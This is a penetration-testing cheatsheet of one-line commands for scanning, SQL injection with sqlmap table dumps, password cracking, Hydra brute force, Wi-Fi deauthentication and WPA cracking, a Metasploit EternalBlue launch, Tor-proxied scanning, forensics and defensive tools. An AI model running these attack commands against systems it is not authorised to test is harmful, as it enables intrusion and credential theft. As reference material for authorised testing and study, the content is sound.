# Security Toolkit Cheatsheet

## Recon & Scanning

```bash
# nmap - network discovery
nmap -sn 192.168.X.0/24                    # ping sweep
nmap -sV -sC -O 192.168.X.1                # version, scripts, OS
nmap -p- -T4 192.168.X.1                   # all ports, fast
nmap -sU -p 53,161,500 192.168.X.1         # UDP scan

# masscan - fast port scan
masscan -p1-65535 192.168.X.0/24 --rate=1000
```

## Web

```bash
# nikto - web vuln scanner
nikto -h http://target.com

# sqlmap - SQL injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

## Passwords

```bash
# john - hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# hashcat - GPU cracking
hashcat -m 0 -a 0 hash.txt rockyou.txt     # MD5
hashcat -m 1000 -a 0 hash.txt rockyou.txt  # NTLM
hashcat -m 1800 -a 0 hash.txt rockyou.txt  # sha512crypt

# hydra - online brute force
hydra -l admin -P rockyou.txt ssh://192.168.X.1
hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Wireless

```bash
# aircrack-ng suite
airmon-ng start wlan0                      # monitor mode
airodump-ng wlan0mon                       # scan networks
airodump-ng -c 6 --bssid XX:XX -w cap wlan0mon  # capture
aireplay-ng -0 5 -a XX:XX wlan0mon         # deauth
aircrack-ng -w rockyou.txt cap-01.cap      # crack WPA
```

## Reverse Engineering

```bash
# radare2
r2 -A binary                               # analyze
afl                                        # list functions
pdf @ main                                 # disasm main
VV @ main                                  # visual graph

# binwalk - firmware analysis
binwalk firmware.bin                       # scan
binwalk -e firmware.bin                    # extract
```

## Forensics

```bash
# sleuthkit
fls -r image.dd                            # list files
icat image.dd 1234 > recovered.file        # extract by inode
mmls image.dd                              # partition table

# volatility3
vol -f memdump.raw windows.info            # OS info
vol -f memdump.raw windows.pslist          # processes
vol -f memdump.raw windows.hashdump        # dump hashes

# testdisk / foremost
testdisk image.dd                          # recover partitions
foremost -i image.dd -o output/            # carve files
```

## Exploitation

```bash
# metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.X.100
set LHOST 192.168.X.50
run
```

## Anonymity

```bash
# tor + proxychains
systemctl start tor
proxychains nmap -sT -Pn 192.168.X.1       # scan through tor
proxychains curl http://target.com
```

## Defense

```bash
# lynis - audit
sudo lynis audit system

# clamav - antivirus
sudo freshclam                             # update defs
clamscan -r /home                          # scan

# fail2ban
sudo fail2ban-client status
sudo fail2ban-client status sshd
sudo fail2ban-client set sshd unbanip 1.2.3.4
```

## SDR/Radio

```bash
# rtl_sdr
rtl_test                                   # test dongle
rtl_fm -f 162.55M -M fm -s 22050 | aplay -r 22050 -f S16_LE  # NOAA weather
rtl_433                                    # decode 433MHz devices

# gqrx - GUI spectrum analyzer
gqrx                                       # FM, AM, SSB, etc
```
